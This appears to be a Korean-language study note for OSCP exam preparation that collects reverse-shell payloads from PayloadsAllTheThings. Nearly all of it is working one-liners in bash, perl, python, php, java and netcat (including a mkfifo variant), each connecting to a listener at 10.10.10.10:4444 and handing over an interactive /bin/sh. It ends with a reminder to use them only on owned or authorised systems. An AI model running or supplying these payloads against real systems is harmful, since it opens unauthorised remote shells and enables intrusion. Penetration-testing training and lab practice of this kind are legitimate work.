# payload (리버스 쉘 페이로드 목록)

## 개요

PayloadsAllTheThings의 목록에서, OSCP 시험에서 자주 쓰이는 셸 페이로드만 골라본다.

## bash / sh

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
/bin/sh -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## perl

```bash
perl -e 'use Socket;$i=\"10.10.10.10\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'
```

## python

```bash
python3 -c '
import socket,subprocess,os
LHOST=\"10.10.10.10\"; LPORT=4444
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((LHOST,LPORT))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call([\"/bin/sh\",\"-i\"])
'
```

## php

```php
<?php
$sock = fsockopen(\"10.10.10.10\", 4444);
$proc = proc_open(\"/bin/sh -i\", [0=>$sock,1=>$sock,2=>$sock], $pipes);
```

## java

```java
r = Runtime.getRuntime()
p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])
p.waitFor()
```

## netcat

```bash
nc -e /bin/sh 10.10.10.10 4444        # -e를 지원하는 nc에서
# -e가 없으면
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

## 사용 시

- listener는 [reverse_shell.md](reverse-shell/reverse_shell.md)의 `LHOST`/`LPORT`와 같은 방식으로 둔다.
- 각 언어의 문법이 조금씩 다르지만, 공통은 \"입출력을 소켓으로 연결\"이다.
- OSCP에서는 여러 언어를 2~3개만 익혀 있으면 충분하다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
